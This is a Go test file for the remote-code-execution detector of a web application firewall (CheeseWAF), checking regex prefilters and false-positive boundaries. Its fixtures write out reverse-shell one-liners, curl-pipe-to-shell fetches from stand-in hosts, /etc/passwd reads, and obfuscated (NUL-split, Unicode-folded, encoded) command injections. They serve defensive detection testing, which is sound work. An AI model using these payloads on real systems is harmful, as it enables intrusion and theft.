package semantic

import (
	"context"
	"fmt"
	"net/http"
	"net/url"
	"strings"
	"testing"

	"github.com/LaokeQwQ/CheeseWAF/internal/engine"
)

func TestSemanticFastAbortMarksIncompleteWithoutBlankInputs(t *testing.T) {
	t.Setenv("CHEESEWAF_SEMANTIC_FAST_ABORT", "1")
	a := NewAnalyzer("block", 5, "rce")
	candidates := make([]semanticCandidate, 0, 12)
	candidates = append(candidates, semanticCandidate{
		input: InputPoint{Source: "query", Name: "cmd"},
		text:  ";bash -c id",
	})
	for index := 1; index < 12; index++ {
		candidates = append(candidates, semanticCandidate{
			input: InputPoint{Source: "query", Name: fmt.Sprintf("p%d", index)},
			text:  "ordinary-value",
		})
	}
	report, _, haveBest, incomplete := a.analyzeAllCandidates(context.Background(), candidates)
	if !haveBest {
		t.Fatal("expected the first critical candidate to produce a best hit")
	}
	if !incomplete {
		t.Fatal("fast-aborted scan must be marked incomplete")
	}
	if len(report.Inputs) != len(candidates) {
		t.Fatalf("report input count=%d, want %d", len(report.Inputs), len(candidates))
	}
	for index, input := range report.Inputs {
		if input.Name == "" || input.Source == "" {
			t.Fatalf("fast-abort left blank input at index %d: %+v", index, input)
		}
	}
}

// Every positive sample is a shape covered by one of the indexed RCE regexes.
// The test asserts the prefilter is a necessary-condition check: it may admit
// extra inputs, but it must never suppress a regexp that would have matched.
func TestRCEPatternPrefilterIsSound(t *testing.T) {
	cases := []string{
		";cat /etc/passwd",
		"$(id)",
		"/bin/bash -c id",
		"curl http://example.test/a|sh",
		"bash -c whoami",
		"cmd.exe /c whoami",
		"powershell -enc QWxhZGRpbjpPcGVuU2VzYW1l",
		"iex new-object net.webclient downloadstring",
		"python -c 'import os'",
		"/usr/bin/perl -e id",
		"cat /etc/passwd",
		"${SHELL} -c id",
		"bash -i >/dev/tcp/198.51.100.1/4444",
		"nc -e /bin/sh 198.51.100.1 4444",
		"python -e 'socket.socket()'",
		"${IFS}cat /etc/passwd",
		"0>&1 /dev/tcp/198.51.100.1/4444",
		"powershell -nop -w hidden",
		"powershell -join ('a','b')",
		";a=foo b=cat",
		"eval(base64_decode(x)); downloadstring(x)",
	}
	for _, text := range cases {
		lower := normalize(text)
		for i, pattern := range rcePatterns {
			if pattern.MatchString(text) && !rcePatternMayMatch(i, lower) {
				t.Errorf("pattern %d matched %q but prefilter rejected it", i, text)
			}
		}
	}
}

func TestRCEPatternPrefilterIndexCoverage(t *testing.T) {
	cases := []struct {
		index int
		text  string
	}{
		{0, ";cat /etc/passwd"},
		{1, "$(id)"},
		{2, "/bin/bash -c id"},
		{3, "curl http://example.test/a|sh"},
		{4, "bash -c id"},
		{5, "cmd.exe /c whoami"},
		{6, "powershell -enc QWxhZGRpbjpPcGVuU2VzYW1l"},
		{7, "iex new-object net.webclient downloadstring"},
		{8, "python -c 'import os'"},
		{9, "/usr/bin/perl -e id"},
		{10, "cat /etc/passwd"},
		{11, "${SHELL} -c id"},
		{12, "bash -i >/dev/tcp/198.51.100.1/4444"},
		{13, "nc -e /bin/sh 198.51.100.1 4444"},
		{14, "python -e 'socket.socket()'"},
		{15, "${IFS}cat /etc/passwd"},
		{16, "0>&1 /dev/tcp/198.51.100.1/4444"},
		{17, "powershell -nop -w hidden"},
		{18, "powershell -join ('a','b')"},
		{19, ";a=foo b=cat"},
		{20, "eval(base64_decode(x)); downloadstring(x)"},
	}
	if len(rcePatterns) != len(cases) {
		t.Fatalf("rce pattern count=%d, prefilter coverage cases=%d; update both together", len(rcePatterns), len(cases))
	}
	for _, tc := range cases {
		if !rcePatterns[tc.index].MatchString(tc.text) {
			t.Fatalf("coverage sample for pattern %d no longer matches: %q", tc.index, tc.text)
		}
		rawLower := strings.ToLower(tc.text)
		if !rcePatternMayMatchViews(tc.index, rawLower, normalize(tc.text)) {
			t.Errorf("prefilter rejected coverage sample for pattern %d: %q", tc.index, tc.text)
		}
	}
}

func TestRCEPatternPrefilterPreservesControlMarkers(t *testing.T) {
	// The gate uses the control-preserving lowercase view, because the raw regex
	// suite recognizes newline-separated shell commands even when normalization
	// later strips controls from a non-ASCII candidate.
	for _, text := range []string{"\ncat /etc/passwd", "\r\nsh -c id", "é\ncat /etc/passwd"} {
		if !rcePatternMayMatch(0, strings.ToLower(text)) && (containsByte(text, '\n') || containsByte(text, '\r')) {
			t.Errorf("newline shell marker was rejected for %q", text)
		}
	}
}

func TestRCEShellMetacharPrefilterCoversPatternVocabulary(t *testing.T) {
	commands := []string{
		"cat", "id", "whoami", "uname", "curl", "wget", "bash", "sh", "zsh", "dash",
		"pwsh", "powershell", "cmd", "python3", "perl", "php", "ruby", "node", "nc", "ncat",
		"netcat", "netstat", "socat", "telnet", "tftp", "dig", "nslookup", "host", "arp",
		"ifconfig", "lua", "gawk", "awk", "sed", "tr", "iex", "type", "dir", "ls", "sleep",
		"echo", "ping", "lsof",
	}
	for _, command := range commands {
		text := ";" + command
		if rceShellMetacharCommand.MatchString(text) && !rceShellMetacharCommandMayMatch(text) {
			t.Errorf("shell metacharacter prefilter rejected command %q", command)
		}
	}
}

func TestRCEPatternPrefilterSupportsUnicodeFoldView(t *testing.T) {
	cases := []struct {
		index int
		text  string
	}{
		{index: 4, text: "ſh -c id"},
		{index: 6, text: "powerſhell -enc QWxhZGRpbjpPcGVuU2VzYW1l"},
		{index: 10, text: "leſs /etc/passwd"},
		{index: 11, text: "$ſHELL -c id"},
		{index: 12, text: "ſh -i >/dev/tcp/198.51.100.1/4444"},
		{index: 15, text: "${IFſ}cat /etc/passwd"},
		{index: 20, text: "frombaſe64(x) syſtem(y)"},
	}
	for _, tc := range cases {
		pattern := rcePatterns[tc.index]
		if !pattern.MatchString(tc.text) {
			t.Fatalf("pattern %d no longer matches Unicode-fold sample %q", tc.index, tc.text)
		}
		rawLower := strings.ToLower(tc.text)
		normalizedLower := normalize(tc.text)
		if rcePatternMayMatch(tc.index, rawLower) {
			t.Fatalf("pattern %d raw view unexpectedly contains an ASCII marker for %q", tc.index, tc.text)
		}
		if !rcePatternMayMatchViews(tc.index, rawLower, normalizedLower) {
			t.Errorf("pattern %d was rejected despite normalized Unicode-fold markers in %q", tc.index, tc.text)
		}
	}
}

func TestAnalyzerRCEKeepsUnicodeFoldedMarkerWhenAnotherHintIsPresent(t *testing.T) {
	// The fullwidth separator is folded to ';' by NFKC, while /etc/ makes the
	// cheap hint pass select LFI as well. RCE must not be lost merely because a
	// different family was hinted first.
	candidate := semanticCandidate{
		input: InputPoint{Source: "query", Name: "cmd"},
		text:  "；cat /etc/passwd",
	}
	hits := NewAnalyzer("block", 5, "rce").analyzeCandidate(candidate)
	if len(hits) == 0 || hits[0].Category != "rce" {
		t.Fatalf("normalized RCE marker was not analyzed: %+v", hits)
	}
}

func TestScanAttackHintsIncludesNormalizedUnicodeMarkers(t *testing.T) {
	hints := scanAttackHints("；cat /etc/passwd")
	if hints&hintRCE == 0 {
		t.Fatalf("normalized shell marker did not open RCE analysis: hints=%b", hints)
	}
}

func TestAnalyzerRCEUsesNormalizedControlPreservingView(t *testing.T) {
	candidate := semanticCandidate{input: InputPoint{Source: "body", Name: "body"}, text: "说明\nｉｄ\nｌｓ -la"}
	hits := NewAnalyzer("block", 5, "rce").analyzeCandidate(candidate)
	if len(hits) == 0 || hits[0].Category != "rce" {
		t.Fatalf("Unicode-folded newline command chain was not detected: %+v", hits)
	}
	if scanAttackHints(candidate.text)&hintRCE == 0 {
		t.Fatal("Unicode-folded newline command chain did not open RCE analysis")
	}
}

func TestAnalyzerRCEDoesNotFastPathBareCommandInExecutionSink(t *testing.T) {
	for _, target := range []string{
		"/run?cmd=id",
		"/run?command=whoami",
		"/run?exec=ls",
		"/run?cmd=cat",
	} {
		t.Run(target, func(t *testing.T) {
			req, err := http.NewRequest(http.MethodGet, target, nil)
			if err != nil {
				t.Fatal(err)
			}
			reqCtx, err := engine.NewRequestContext(req, "default")
			if err != nil {
				t.Fatal(err)
			}
			result, err := NewAnalyzer("block", 5, "rce").Detect(context.Background(), reqCtx)
			if err != nil {
				t.Fatal(err)
			}
			if result == nil || !result.Detected || result.Category != "rce" {
				t.Fatalf("bare command in execution sink was skipped: %+v", result)
			}
		})
	}
}

func TestAnalyzerRCEExecutionSinkMultiwordValues(t *testing.T) {
	for _, target := range []string{
		"/run?cmd=ls+-la",
		"/run?cmd=cat+%2Fetc%2Fpasswd",
		"/run?cmd=whoami+-a",
		"/run?cmd=id+-u",
		"/run?cmd=uname+-a",
		"/run?cmd=echo+hi",
		"/run?cmd=rm+-rf+%2Ftmp%2Fx",
		"/run?cmd=python3+-c+%27id%27",
		"/run?cmd=perl+-e+%27print%201%27",
		"/run?cmd=php+-r+%27system(%22id%22)%27",
		"/run?cmd=node+-r+%27child_process%27",
		"/run?cmd=%24%7BSHELL%7D+-c+id",
		"/run?cmd=python3.11+-c+%27id%27",
		"/run?cmd=python3.11",
		"/run?cmd=env+bash+-c+id",
	} {
		t.Run(target, func(t *testing.T) {
			req, err := http.NewRequest(http.MethodGet, target, nil)
			if err != nil {
				t.Fatal(err)
			}
			reqCtx, err := engine.NewRequestContext(req, "default")
			if err != nil {
				t.Fatal(err)
			}
			result, err := NewAnalyzer("block", 5, "rce").Detect(context.Background(), reqCtx)
			if err != nil {
				t.Fatal(err)
			}
			if result == nil || !result.Detected || result.Category != "rce" {
				t.Fatalf("multi-word command sink was skipped: %+v", result)
			}
		})
	}
}

func TestAnalyzerRCEExecutionSinkNameBoundary(t *testing.T) {
	for _, target := range []string{
		"/api?cmd=status",
		"/api?script_version=ls+-la",
		"/api?payload_id=cat",
		"/api?process_name=env",
		"/api?run=hello",
		"/api?cmd=please+review+id",
	} {
		t.Run(target, func(t *testing.T) {
			req, err := http.NewRequest(http.MethodGet, target, nil)
			if err != nil {
				t.Fatal(err)
			}
			reqCtx, err := engine.NewRequestContext(req, "default")
			if err != nil {
				t.Fatal(err)
			}
			result, err := NewAnalyzer("block", 5, "rce").Detect(context.Background(), reqCtx)
			if err != nil {
				t.Fatal(err)
			}
			if result != nil {
				t.Fatalf("ambiguous/non-command field produced RCE: %+v", result)
			}
		})
	}
}

func TestAnalyzerRCEExecutionSinkRequiresRequestValueSource(t *testing.T) {
	for _, tc := range []struct {
		name   string
		header string
		value  string
		body   string
		want   bool
	}{
		{name: "command-header", header: "X-Command", value: "id"},
		{name: "cmd-header", header: "X-Cmd", value: "id"},
		{name: "execute-header", header: "X-Execute", value: "id"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			got := detectOnTargetWithHeader(t, NewAnalyzer("block", 5, "rce"), "GET", "/docs", "", tc.body, tc.header, tc.value)
			if got != nil && got.Detected {
				t.Fatalf("bare command in ordinary header was treated as an execution sink: %+v", got)
			}
		})
	}
	// A documentation JSON field named execute is intentionally ambiguous. It
	// must not grant sink authority by itself, while shell syntax in a header
	// remains globally eligible through the normal RCE grammar.
	if got := detectOnTarget(t, NewAnalyzer("block", 5, "rce"), "POST", "/docs", "application/json", `{"execute":"id"}`); got != nil && got.Detected {
		t.Fatalf("documentation JSON execute field produced a bare-sink RCE: %+v", got)
	}
	if got := detectOnTargetWithHeader(t, NewAnalyzer("block", 5, "rce"), "GET", "/docs", "", "", "X-Command", ";whoami"); got == nil || !got.Detected || got.Category != "rce" {
		t.Fatalf("shell syntax in a header should remain detectable: %+v", got)
	}
}

func TestAnalyzerRCEExecutionSinkAliasesAndNULSplits(t *testing.T) {
	positive := []string{
		"/run?cmd.exe=id",
		"/run?command_line=whoami",
		"/run?cmd=ba%00sh+-c+id",
		"/run?cmd=po%00wershell+-enc+QWxhZGRpbjpPcGVuU2VzYW1l",
		"/run?cmd=py%00thon3+-c+id",
		"/run?cmd=ne%00w-object+system.net.webclient+downloadstring",
	}
	for _, target := range positive {
		t.Run(target, func(t *testing.T) {
			got := detectOnTarget(t, NewAnalyzer("block", 5, "rce"), "GET", target, "", "")
			if got == nil || !got.Detected || got.Category != "rce" {
				t.Fatalf("explicit sink alias/NUL split was missed: %+v", got)
			}
		})
	}
	for _, tc := range []struct {
		name   string
		target string
		ct     string
		body   string
	}{
		{name: "non-sink-doc", target: "/docs?q=po%00wershell+-enc+QWxhZGRpbjpPcGVuU2VzYW1l"},
		{name: "prose-command", target: "/run?cmd=please%00review+id"},
		{name: "benign-command-line", target: "/docs", ct: "application/json", body: `{"command_line":"npm run test:unit"}`},
	} {
		t.Run(tc.name, func(t *testing.T) {
			got := detectOnTarget(t, NewAnalyzer("block", 5, "rce"), "POST", tc.target, tc.ct, tc.body)
			if got != nil && got.Detected {
				t.Fatalf("NUL compaction or alias gate produced a false positive: %+v", got)
			}
		})
	}
}

// Compound command-parameter names are present in both dispatch APIs and
// ordinary build/diagnostic metadata.  Keep the former high-confidence shapes
// while refusing version/help/health-check values that merely mention an
// executable.  The NUL-split positives pin the same boundary after decoding.
func TestAnalyzerRCECompoundSinkHighConfidenceBoundary(t *testing.T) {
	positive := []string{
		"/run?cmd.exe=" + url.QueryEscape("cmd.exe /c whoami"),
		"/run?command_line=" + url.QueryEscape("po\x00wershell -enc QWxhZGRpbjpPcGVuU2VzYW1l"),
		"/run?command_line=" + url.QueryEscape("py\x00thon3 -c id"),
		"/run?commandline=" + url.QueryEscape("cmd.exe /c net user"),
		"/run?cmdline=" + url.QueryEscape("cu\x00rl http://evil.example/x|sh"),
		"/run?command_line=" + url.QueryEscape("python3 -c \\\"__import__('os').system('id')\\\""),
		"/run?command_line=" + url.QueryEscape("python3 -c 'cat /etc/passwd'"),
		"/run?command_line=" + url.QueryEscape("python3 -C id"),
	}
	for _, target := range positive {
		t.Run("positive/"+target, func(t *testing.T) {
			got := detectOnTarget(t, NewAnalyzer("block", 5, "rce"), "GET", target, "", "")
			if got == nil || !got.Detected || got.Category != "rce" {
				t.Fatalf("high-confidence compound sink was missed: target=%q result=%+v", target, got)
			}
		})
	}

	negative := []string{
		"/docs?cmd.exe=" + url.QueryEscape("cmd.exe /?"),
		"/docs?command_line=" + url.QueryEscape("python3 --version"),
		"/docs?command_line=" + url.QueryEscape("python3 --help"),
		"/docs?command_line=" + url.QueryEscape("powershell -?"),
		"/docs?command_line=" + url.QueryEscape("powershell Get-Help"),
		"/docs?command_line=" + url.QueryEscape("powershell -NoProfile -Command Get-Help"),
		"/docs?command_line=" + url.QueryEscape("powershell -NoProfile -Command \\\"Write-Output ok\\\""),
		"/docs?command_line=" + url.QueryEscape("cmd.exe /c dir"),
		"/docs?command_line=" + url.QueryEscape("cmd.exe /c ping 127.0.0.1"),
		"/docs?command_line=" + url.QueryEscape("cmd.exe /c nslookup health"),
		"/docs?command_line=" + url.QueryEscape("cmd.exe /c curl https://example.com/health"),
		"/docs?command_line=" + url.QueryEscape("curl https://example.com/health"),
		"/docs?command_line=" + url.QueryEscape("py\x00thon3 --version"),
		"/docs?command_line=" + url.QueryEscape("po\x00wershell -Help"),
		"/docs?cmdline=" + url.QueryEscape("please review id"),
		"/docs?command_line=" + url.QueryEscape("python3 -c print(1)"),
		"/docs?command_line=" + url.QueryEscape("python3 -c \\\"print('hello')\\\""),
		"/docs?command_line=" + url.QueryEscape("python3 -c \\\"print('whoami')\\\""),
		"/docs?command_line=" + url.QueryEscape("python3 -c \\\"print('cat /etc/passwd')\\\""),
	}
	for _, target := range negative {
		t.Run("negative/"+target, func(t *testing.T) {
			got := detectOnTarget(t, NewAnalyzer("block", 5, "rce"), "GET", target, "", "")
			if got != nil && got.Detected {
				t.Fatalf("diagnostic/documentation compound sink produced RCE: target=%q result=%+v", target, got)
			}
		})
	}
}

func TestAnalyzerRCEExecutionSinkNormalizesUnicodeName(t *testing.T) {
	for _, value := range []string{"id", "ls -la"} {
		t.Run(value, func(t *testing.T) {
			target := "/run?" + url.QueryEscape("ｃｍｄ") + "=" + url.QueryEscape(value)
			req, err := http.NewRequest(http.MethodGet, target, nil)
			if err != nil {
				t.Fatal(err)
			}
			reqCtx, err := engine.NewRequestContext(req, "default")
			if err != nil {
				t.Fatal(err)
			}
			result, err := NewAnalyzer("block", 5, "rce").Detect(context.Background(), reqCtx)
			if err != nil {
				t.Fatal(err)
			}
			if result == nil || !result.Detected || result.Category != "rce" {
				t.Fatalf("unicode command sink was skipped for %q: %+v", value, result)
			}
		})
	}

	// NFKC must not turn an ordinary field whose name merely contains a
	// command-looking word into an execution sink.
	target := "/api?" + url.QueryEscape("ｓｃｒｉｐｔ_ｖｅｒｓｉｏｎ") + "=" + url.QueryEscape("ls -la")
	req, err := http.NewRequest(http.MethodGet, target, nil)
	if err != nil {
		t.Fatal(err)
	}
	reqCtx, err := engine.NewRequestContext(req, "default")
	if err != nil {
		t.Fatal(err)
	}
	result, err := NewAnalyzer("block", 5, "rce").Detect(context.Background(), reqCtx)
	if err != nil {
		t.Fatal(err)
	}
	if result != nil {
		t.Fatalf("unicode non-command field produced RCE: %+v", result)
	}
	if rceBareCommandSinkValue("ｃｍｄ", "ｃｍｄ") || rceCommandSinkShape("ｃｍｄ", "ｃｍｄ") {
		t.Fatal("normalized command key was treated as its own executable value")
	}
	if rceExecutionSink("c\x00md") {
		t.Fatal("control-bearing field name was promoted to an execution sink")
	}
}

func TestStandaloneRCEDetectorUsesNormalizedFallback(t *testing.T) {
	for _, target := range []string{
		"；cat /etc/passwd",
		"ｂａｓｈ -c id",
		"powerſhell -enc QWxhZGRpbjpPcGVuU2VzYW1l",
	} {
		t.Run(target, func(t *testing.T) {
			req, err := http.NewRequest(http.MethodPost, "/submit", strings.NewReader(target))
			if err != nil {
				t.Fatal(err)
			}
			reqCtx, err := engine.NewRequestContext(req, "default")
			if err != nil {
				t.Fatal(err)
			}
			result, err := NewRCEDetector("block").Detect(context.Background(), reqCtx)
			if err != nil {
				t.Fatal(err)
			}
			if result == nil || !result.Detected || result.Category != "rce" {
				t.Fatalf("normalized RCE payload was not detected: %+v", result)
			}
		})
	}
}

func TestMarkdownTableShapeRecognizesSingleHyphenAlignment(t *testing.T) {
	text := "|Information Gathering||||||\n|:-:|:-:|:-:|:-:|:-:|:-:|\n|id|ls|"
	if !markdownTableShape(text) {
		t.Fatal("single-hyphen Markdown alignment row was not recognized")
	}
}

func TestMarkdownTableShapeRejectsShellLogicalOr(t *testing.T) {
	text := "| Tool | Purpose |\n| --- | --- |\n| id || whoami |"
	if markdownTableShape(text) {
		t.Fatal("shell logical-or inside a table cell was treated as harmless table markup")
	}
}

func TestMarkdownTableDoesNotSuppressCommandPayloads(t *testing.T) {
	for _, command := range []string{
		"tftp 198.51.100.1 69",
		"arp -a",
		"route -n",
	} {
		t.Run(command, func(t *testing.T) {
			body := "| Tool | Purpose |\n| --- | --- |\n| " + command + " | execute |"
			got, err := NewAnalyzer("block", 2).Detect(context.Background(), markdownProseRequest(t, body))
			if err != nil {
				t.Fatal(err)
			}
			if got == nil || !got.Detected || got.Category != "rce" {
				t.Fatalf("table command payload was suppressed: command=%q result=%+v", command, got)
			}
		})
	}
}

func TestMarkdownTableCommandHeuristicKeepsDescriptionsClean(t *testing.T) {
	body := "| Tool | Usage |\n| --- | --- |\n| grep | grep pattern |\n| id | print the current uid |"
	got, err := NewAnalyzer("block", 2).Detect(context.Background(), markdownProseRequest(t, body))
	if err != nil {
		t.Fatal(err)
	}
	if got != nil && got.Detected {
		t.Fatalf("ordinary command descriptions in a Markdown table produced RCE: %+v", got)
	}

	body = "| Tool | Usage |\n| --- | --- |\n| grep | run grep pattern |"
	got, err = NewAnalyzer("block", 2).Detect(context.Background(), markdownProseRequest(t, body))
	if err != nil {
		t.Fatal(err)
	}
	if got != nil && got.Detected {
		t.Fatalf("a prose description beginning with run produced RCE: %+v", got)
	}
}

func TestRCEBacktickDocumentationCommandsStayClean(t *testing.T) {
	cases := []string{
		"Use `env` to configure the process.",
		"The `rm` command removes temporary files.",
		"Use `cp` to copy a file between directories.",
		"The `ssh` client connects to a remote host.",
		"The `host` command performs a DNS lookup.",
		"Use `head` and `tail` to inspect logs.",
		"The `echo` utility prints text.",
		"This documentation explains configuration. Use `env` to configure the process. No commands are executed and this paragraph is explanatory text only.",
		"Reference: new-\x00object system.net.webclient is a class name, not an invocation.",
		"Reference: new-%00object system.net.webclient is a class name, not an invocation.",
		"Reference: new-\\u0000object system.net.webclient is a class name, not an invocation.",
	}
	for _, body := range cases {
		t.Run(body, func(t *testing.T) {
			got, err := NewAnalyzer("block", 2).Detect(context.Background(), markdownProseRequest(t, body))
			if err != nil {
				t.Fatal(err)
			}
			if got != nil && got.Detected {
				t.Fatalf("documentation/control-boundary text produced RCE: %+v", got)
			}
		})
	}
}

func TestRCEEncodedControlBoundariesKeepSinkRecall(t *testing.T) {
	analyzer := NewAnalyzer("block", 2)
	if got := detectOnTarget(t, analyzer, "GET", "/docs?q=new-%00object%20system.net.webclient", "", ""); got != nil && got.Detected {
		t.Fatalf("encoded NUL in ordinary documentation produced RCE: %+v", got)
	}
	if got := detectOnTarget(t, analyzer, "GET", "/run?cmd=%00id%00ls+-la", "", ""); got == nil || !got.Detected || got.Category != "rce" {
		t.Fatalf("encoded NUL command sink was missed: %+v", got)
	}

	for _, raw := range []string{
		"Reference: new-%00object system.net.webclient is a class name.",
		`{"text":"Reference: new-%00object system.net.webclient is a class name."}`,
	} {
		if got := detectOnTarget(t, analyzer, "POST", "/docs", "application/json", raw); got != nil && got.Detected {
			t.Fatalf("encoded NUL documentation produced RCE: raw=%q result=%+v", raw, got)
		}
	}
}

func TestRCENewlineCommandDocumentationAndLogShapesStayClean(t *testing.T) {
	clean := []string{
		"Usage examples:\ngrep pattern\nhead file\nThese commands inspect logs.",
		"The guide lists commands:\ncat file\nls -la\nfor reference only.",
		"Command reference:\nid\nls\nThese are shell examples.",
		"id\nls",
	}
	for _, body := range clean {
		t.Run(body, func(t *testing.T) {
			candidate := semanticCandidate{input: InputPoint{Source: "body.raw", Name: "body"}, text: body}
			if hits := NewAnalyzer("block", 5, "rce").analyzeCandidate(candidate); len(hits) != 0 {
				t.Fatalf("documentation/log newline chain produced RCE: %q -> %+v", body, hits)
			}
		})
	}

	for _, body := range []string{
		"hello\nid\nls -la /tmp",
		"This documentation is filler.\nhello\nid\nls -la /tmp",
	} {
		t.Run("attack/"+body, func(t *testing.T) {
			candidate := semanticCandidate{input: InputPoint{Source: "body.raw", Name: "body"}, text: body}
			if hits := NewAnalyzer("block", 5, "rce").analyzeCandidate(candidate); len(hits) == 0 {
				t.Fatalf("newline command chain was missed: %q", body)
			}
		})
	}
}

func TestStandaloneRCEKeepsEncodedControlBoundaryClean(t *testing.T) {
	req, err := http.NewRequest(http.MethodGet, "/docs?q=new-%00object%20system.net.webclient", nil)
	if err != nil {
		t.Fatal(err)
	}
	reqCtx, err := engine.NewRequestContext(req, "default")
	if err != nil {
		t.Fatal(err)
	}
	result, err := NewRCEDetector("block").Detect(context.Background(), reqCtx)
	if err != nil {
		t.Fatal(err)
	}
	if result != nil && result.Detected {
		t.Fatalf("standalone detector treated encoded NUL documentation as RCE: %+v", result)
	}
}

func TestRCEAliasRequiresExecutableArgumentEvidence(t *testing.T) {
	clean := []string{
		"The engineer reviewed this; route entries use arp tables.",
		"The network note says; arp table details are listed below.",
		"The protocol note says; tftp is a legacy transfer protocol.",
		"The text ; route -n appears in logs.",
		"See ; route -n in examples.",
		"The transform uses; tr -d x in examples.",
		"The note says; tftp 198.51.100.1 69 is documented.",
		"Use ; tftp 10.0.0.1 as an example in the manual.",
		"The browser note says; fetch is an API call.",
		"The history note says; lynx was a text browser.",
		"The shell guide says; ksh is a compatible shell.",
		"The admin guide says; scp transfers files.",
	}
	for _, body := range clean {
		t.Run(body, func(t *testing.T) {
			got, err := NewAnalyzer("block", 2).Detect(context.Background(), markdownProseRequest(t, body))
			if err != nil {
				t.Fatal(err)
			}
			if got != nil && got.Detected {
				t.Fatalf("alias-only prose produced RCE: %+v", got)
			}
		})
	}
	for _, body := range []string{";tftp 198.51.100.1 69", ";arp -a", ";route -n", ";tr -d x"} {
		t.Run(body, func(t *testing.T) {
			candidate := semanticCandidate{input: InputPoint{Source: "body.raw", Name: "body"}, text: body}
			if hits := NewAnalyzer("block", 2, "rce").analyzeCandidate(candidate); len(hits) == 0 {
				t.Fatalf("executable alias payload was missed: %q", body)
			}
		})
	}
}

func TestRCEOrdinaryHeadersDoNotTreatInlineCommandAsExecution(t *testing.T) {
	cases := []struct {
		name, value string
	}{
		{"X-Test", "`id`"},
		{"X-Test", "Foo `id` bar"},
		{"X-Test", "Foo/1.2 `id`"},
		{"User-Agent", "Mozilla/5.0 `id`"},
		{"User-Agent", "curl/8.0 `id`"},
	}
	analyzer := NewAnalyzer("block", 2)
	for _, tc := range cases {
		t.Run(tc.name+"/"+tc.value, func(t *testing.T) {
			got := detectOnTargetWithHeader(t, analyzer, "GET", "/status", "", "", tc.name, tc.value)
			if got != nil && got.Detected {
				t.Fatalf("ordinary header inline code produced RCE: header=%q value=%q result=%+v", tc.name, tc.value, got)
			}
		})
	}
}

func TestMarkdownEmptyPipeRowsDoNotSuppressCommands(t *testing.T) {
	text := "||||||\n|---|---|\n||||||\n|id|whoami|"
	if markdownTableShape(text) {
		t.Fatal("empty pipe rows were accepted as Markdown table neighbours")
	}
	candidate := semanticCandidate{input: InputPoint{Source: "body.raw", Name: "body"}, text: text}
	if hits := NewAnalyzer("block", 2, "rce").analyzeCandidate(candidate); len(hits) == 0 {
		t.Fatal("command hidden after empty pipe rows was missed")
	}
}

func TestRCEReverseShellPrefilterAcceptsFlexibleWhitespace(t *testing.T) {
	for _, text := range []string{"bash -i", "bash   -i", "bash\t-i"} {
		if !rceReverseShellPrimitive.MatchString(text) {
			t.Fatalf("reverse-shell control regexp does not match %q", text)
		}
		if !rceReverseShellPrimitiveMayMatch(strings.ToLower(text)) {
			t.Errorf("reverse-shell prefilter rejected %q", text)
		}
	}
}

func TestRCECustomPrefiltersCoverFlexibleRegexpWhitespace(t *testing.T) {
	for _, text := range []string{"${ifs", "${IFS}", "$ifs"} {
		if !rceWhitespaceEvasion.MatchString(text) {
			t.Fatalf("whitespace-evasion regexp does not match %q", text)
		}
		if !rceWhitespaceEvasionMayMatch(strings.ToLower(text)) {
			t.Errorf("whitespace-evasion prefilter rejected %q", text)
		}
	}
	for _, text := range []string{"iwr\thttp://evil.example/x", "iwr\nhttp://evil.example/x"} {
		if !rceNetWebClientSideFx.MatchString(text) {
			t.Fatalf("web-client regexp does not match %q", text)
		}
		if !rceNetWebClientSideFxMayMatch(strings.ToLower(text)) {
			t.Errorf("web-client prefilter rejected %q", text)
		}
	}
}

func TestRCENewlineScannerPreservesLegacyBoundaries(t *testing.T) {
	cases := []struct {
		name, text   string
		count, first int
		hasArguments bool
	}{
		{name: "crlf-and-uppercase", text: "intro\r\nID\r\nls -la", count: 2, first: 1, hasArguments: true},
		{name: "cr-only", text: "intro\rID\rLS", count: 2, first: 1, hasArguments: false},
		{name: "unicode-space", text: "\u00a0ID\u2003-x\n\tLS\t-la", count: 2, first: 0, hasArguments: true},
		{name: "trimmed-command-punctuation", text: "intro\n|id| \n&ls&", count: 2, first: 1, hasArguments: false},
		{name: "path-qualified-argument", text: "intro\n/bin/cat /etc/passwd\nwhoami", count: 1, first: 2, hasArguments: true},
		{name: "unicode-field-separator", text: "intro\nID\u000bls\nLS", count: 2, first: 1, hasArguments: true},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			count, first := rceNewlineCommandStats(tc.text)
			if count != tc.count || first != tc.first {
				t.Fatalf("rceNewlineCommandStats(%q) = (%d, %d), want (%d, %d)", tc.text, count, first, tc.count, tc.first)
			}
			if got := rceNewlineCommandChainHasArguments(tc.text); got != tc.hasArguments {
				t.Fatalf("rceNewlineCommandChainHasArguments(%q) = %v, want %v", tc.text, got, tc.hasArguments)
			}
		})
	}
}

func TestAnalyzerRCERepresentativePatternCoverage(t *testing.T) {
	cases := []string{
		";tftp 198.51.100.1 69",
		";arp -a",
		";route -n",
		";gawk '{print $1}' /var/log/auth.log",
		";tr -d x",
		"cmd /c net user",
		"cat /etc/passwd",
		"0>&1 /dev/tcp/198.51.100.1/4444",
		"powershell -nop -w hidden",
		"powershell -join ('a','b')",
		";a=foo b=cat",
		"eval(base64_decode(x)); downloadstring(x)",
	}
	for _, payload := range cases {
		t.Run(payload, func(t *testing.T) {
			candidate := semanticCandidate{input: InputPoint{Source: "body", Name: "body"}, text: payload}
			if hits := NewAnalyzer("block", 5, "rce").analyzeCandidate(candidate); len(hits) == 0 {
				t.Fatalf("representative RCE pattern was not detected: %q", payload)
			}
		})
	}
}

func containsByte(s string, want byte) bool {
	for i := 0; i < len(s); i++ {
		if s[i] == want {
			return true
		}
	}
	return false
}
